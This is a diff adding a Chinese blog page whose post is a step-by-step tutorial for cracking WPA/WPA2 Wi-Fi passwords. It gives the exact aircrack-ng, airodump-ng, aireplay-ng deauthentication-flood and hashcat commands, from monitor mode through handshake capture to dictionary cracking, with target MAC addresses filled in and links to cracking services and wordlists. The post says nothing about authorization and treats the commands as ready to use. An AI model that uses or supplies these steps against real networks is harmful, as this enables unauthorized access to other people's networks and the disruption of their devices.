@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"xiaotaoist.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 写在前面这里假定你用的是Manjaro Linux 系统，配置好独立显卡，本文提到的软件可以直接用sudo pacman -S aircrack-ng hashcat hashcat-utils安装,Kali Linux默认集成，其他环境请自行安装。  aircrack-ng:aircrack-ng是目前最热门的WiFi破解领域的软件。Aircrack-n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用Aircrack&amp;hashcat破解WPA&#x2F;WPA2">
+<meta property="og:url" content="https://xiaotaoist.github.io/2018/03/15/aircrack-hashcat/index.html">
+<meta property="og:site_name" content="XiaoTaoist&#39;s Blog">
+<meta property="og:description" content="&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 写在前面这里假定你用的是Manjaro Linux 系统，配置好独立显卡，本文提到的软件可以直接用sudo pacman -S aircrack-ng hashcat hashcat-utils安装,Kali Linux默认集成，其他环境请自行安装。  aircrack-ng:aircrack-ng是目前最热门的WiFi破解领域的软件。Aircrack-n">
+<meta property="og:locale">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/hashcat.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/aircrack_mon.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/aircrack_iw.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/aircrack_dump.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/aircrack_replay.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/aircrack_wpa.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/cap2hccapx.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/hashcat_gpu.png">
+<meta property="og:image" content="https://xiaotaoist.github.io/img/hashcat_pro.png">
+<meta property="article:published_time" content="2018-03-15T11:45:11.000Z">
+<meta property="article:modified_time" content="2018-03-20T08:00:21.317Z">
+<meta property="article:author" content="taoist">
+<meta property="article:tag" content="WiFi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiaotaoist.github.io/img/hashcat.png">
+
+<link rel="canonical" href="https://xiaotaoist.github.io/2018/03/15/aircrack-hashcat/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>使用Aircrack&hashcat破解WPA/WPA2 | XiaoTaoist's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">XiaoTaoist's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://xiaotaoist.github.io/2018/03/15/aircrack-hashcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/img/userico.png">
+      <meta itemprop="name" content="taoist">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="XiaoTaoist's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          使用Aircrack&hashcat破解WPA/WPA2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-03-15 19:45:11" itemprop="dateCreated datePublished" datetime="2018-03-15T19:45:11+08:00">2018-03-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-03-20 16:00:21" itemprop="dateModified" datetime="2018-03-20T16:00:21+08:00">2018-03-20</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>0</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>0:01</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>====================</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这里假定你用的是Manjaro Linux 系统，<a href="/2018/03/19/Bumblebee/">配置好独立显卡</a>，本文提到的软件可以直接用<code>sudo pacman -S aircrack-ng hashcat hashcat-utils</code>安装,Kali Linux默认集成，其他环境请自行安装。</p>
+<ul>
+<li>aircrack-ng:<br><a target="_blank" rel="noopener" href="https://www.aircrack-ng.org/doku.php">aircrack-ng</a>是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。</li>
+<li>hashcat:<br><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/">hashcat</a>支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。</li>
+<li>USB无线网卡:<br>推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。</li>
+</ul>
+<p>由于hashcat使用GPU破解，因此需要安装依赖，<code>sudo pacman -S ocl-icd opencl-nvidia</code>,执行<br><code>sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ON</code>以让CUDA程序使用英伟达独立显卡。</p>
+<a id="more"></a>
+<blockquote>
+<p>hashcat -I<br><img src="/img/hashcat.png" alt="hashcat"><br>看到你的独显信息就可以愉快的使用hashcat了。</p>
+</blockquote>
+<h2 id="Aircrack"><a href="#Aircrack" class="headerlink" title="Aircrack"></a>Aircrack</h2><ul>
+<li><p>查看无线网卡，我的网卡为wlan0</p>
+<blockquote>
+<p>airmon-ng<br><img src="/img/aircrack_mon.png" alt="airmon"></p>
+</blockquote>
+</li>
+<li><p>将网卡设为监听模式</p>
+<blockquote>
+<p>airmon-ng start wlan0<br>执行<code>iwconfig</code>出现<code>Mode:Monitor</code>即执行成功，并可以看到网卡被重命名为<code>wlan0mon</code>。<br>若执行失败，请先尝试<code>airmon-ng check kill</code>，依旧不行，请检查你的网卡驱动是否被<a target="_blank" rel="noopener" href="https://wireless.wiki.kernel.org/en/users/drivers">支持</a><br><img src="/img/aircrack_iw.png" alt="iwconfig"></p>
+</blockquote>
+</li>
+<li><p>搜索目标</p>
+<blockquote>
+<p>airodump-ng wlan0mon<br><img src="/img/aircrack_dump.png" alt="airdump"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BSSID:无线路由的MAC地址</span><br><span class="line">PWR：无线信号强度（绝对值越小表示信号越强）</span><br><span class="line">CH:信道号</span><br><span class="line">ENC:加密体系，常见WPA，WPA2，WEP</span><br><span class="line">ESSID:扩展路由名称</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>这里以ELJNB为例，进行抓包：</p>
+<blockquote>
+<p>airodump-ng –bssid DC:FE:18:C4:20:E3 -o pcap -w my -c 1 wlan0mon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--bssid: 指定无线路由的MAC地址,这里是ELJNB的MAC地址</span><br><span class="line">-o:指定输出文件格式， 支持pcap, ivs, csv, gps, kismet, netxml</span><br><span class="line">-w:保存文件名称，会自动加01，02，03作为序号。</span><br><span class="line">-c:指定工作频道，ELJNB工作在频道1</span><br><span class="line">最后是你的网卡接口名称</span><br></pre></td></tr></table></figure>
+<p><img src="/img/aircrack_replay.png" alt="replay"><br>注意<code>STATION</code>那列里的MAC地址，稍后会用到，并保持airodump-ng一直处于运行状态。</p>
+</blockquote>
+</li>
+<li><p>加速获取握手包<br>我们可以使用泛洪攻击断开某设备的连接，迫使其重连,以顺利捕获我们需要的数据（含有WiFi的密码数据包）。新开一个终端，输入</p>
+<blockquote>
+<p>aireplay-ng –deauth 1 –a DC:FE:18:C4:20:E3 -c E6:20:3A:A4:82:10 wlan0mon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--deauth:取消验证洪水攻击，后面是攻击次数，0代表无限次数。</span><br><span class="line">-a:目标路由MAC地址</span><br><span class="line">-c:连到这个路由某的设备MAC地址，可以在STATION那列中随便选一个。</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+</ul>
+<p>回到airodump-ng窗口,若在右上角发现<code>WPA handshake</code> ，即成功捕获数据。若不成功请多试几次。<br><img src="/img/aircrack_wpa.png" alt="handskake"><br>顺利捕获数据后就可以用<code>Ctrl+C</code>终止airodump-ng了。会发现它在当前路径生成了一个my-01.cap文件，现在可以进行最后一步,破解数据了。</p>
+<ul>
+<li>暴力破解<ul>
+<li>在线破解：<a target="_blank" rel="noopener" href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php">Online Hash Crack</a>  <a target="_blank" rel="noopener" href="https://gpuhash.me/">GPUHASH.me</a>  <a target="_blank" rel="noopener" href="http://www.md5this.com/tools/wpa-wpa2-password-crack.html">md5this</a></li>
+<li>本地破解:<br><code>aircrack-ng -w dict.txt my-01.cap</code><br>这里破解速度就取决与你CPU性能和字典文件(dict.txt)够不够强大了。<br>如果需要，可以从网上找一些<a target="_blank" rel="noopener" href="https://github.com/conwnet/wpa-dictionary">字典文件</a><br>aircrack-ng使用CPU破解，效率比较低，这里推荐hashcat，它可以使用GPU加速你的破解过程。</li>
+</ul>
+</li>
+</ul>
+<h2 id="haschcat"><a href="#haschcat" class="headerlink" title="haschcat"></a>haschcat</h2><p>hashcat需要特殊的hash数据包格式，因此需要先将airodump-ng抓取的数据包转换一下，<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hccapx/">在线转换</a>或本地使hashcat-utils所提供的工具包</p>
+<ul>
+<li><p>用cap2hccapx将cap转化为hccapx<br><img src="/img/cap2hccapx.png" alt="cap2hcc"></p>
+</li>
+<li><p>开始暴力破解</p>
+<blockquote>
+<p>hashcat -m 2500  test.hccapx dict.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-m:hash类型 2500 为wpa&#x2F;wpa2</span><br><span class="line">test.hccapx:数据包文件</span><br><span class="line">dict.txt:为字典文件</span><br></pre></td></tr></table></figure>
+<p><img src="/img/hashcat_gpu.png" alt="hashcat"><br>破解结束后，查看结果<br>cat ～/.hashcat/hashcat.porifle<br><img src="/img/hashcat_pro.png" alt="result"><br>最后即为WiFi密码，关于hashcat高级使用方式，见<a target="_blank" rel="noopener" href="http://wps2015.org/drops/drops/GPU%E7%A0%B4%E8%A7%A3%E7%A5%9E%E5%99%A8Hashcat%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html">wooyun</a></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>可以看到，整个过程无非两步，第一步抓取<code>WPA handshake</code>数据包，第二步暴力破解数据文件。因此<br>可以使用更强大的工具<code>wlandump-ng</code>：一次性从附近的网络上抓取所有的 handshake 信息，而实现快速破解WiFi,详情见<a target="_blank" rel="noopener" href="https://github.com/brannondorsey/wifi-cracking/blob/master/appendix.zh.md">wifi-cracking</a>和<a target="_blank" rel="noopener" href="https://github.com/ZerBea/hcxtools">hcxtools</a></p>
+<p><strong>最大的安全隐患永远是人</strong>，优先使用WiFi万能钥匙也许会有意外惊喜(配合手机自带的WiFi分享功能，可以直接得到密码)。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.bennythink.com/wifi-cracking.html">https://www.bennythink.com/wifi-cracking.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://klionsec.github.io/2015/04/14/aircrack-hascat/">https://klionsec.github.io/2015/04/14/aircrack-hascat/</a></li>
+<li><a target="_blank" rel="noopener" href="http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</a></li>
+<li><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WiFi/" rel="tag"># WiFi</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/03/14/oh-my-zsh/" rel="prev" title="终端环境之Zsh＆oh-my-zsh">
+      <i class="fa fa-chevron-left"></i> 终端环境之Zsh＆oh-my-zsh
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/03/19/Bumblebee/" rel="next" title="Manjaro Linux 配置Intel与Nvidia双显卡切换">
+      Manjaro Linux 配置Intel与Nvidia双显卡切换 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Aircrack"><span class="nav-number">2.</span> <span class="nav-text">Aircrack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#haschcat"><span class="nav-number">3.</span> <span class="nav-text">haschcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A9%E5%B1%95"><span class="nav-number">4.</span> <span class="nav-text">扩展</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="taoist"
+      src="/img/userico.png">
+  <p class="site-author-name" itemprop="name">taoist</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaoTaoist" title="GitHub → https://github.com/xiaoTaoist" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:taoist@protonmail.com" title="E-Mail → mailto:taoist@protonmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://MiniFullC.github.io" title="https://MiniFullC.github.io" rel="noopener" target="_blank">Musuc</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://kexuecat.github.io" title="https://kexuecat.github.io" rel="noopener" target="_blank">SkyMirror</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">taoist</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
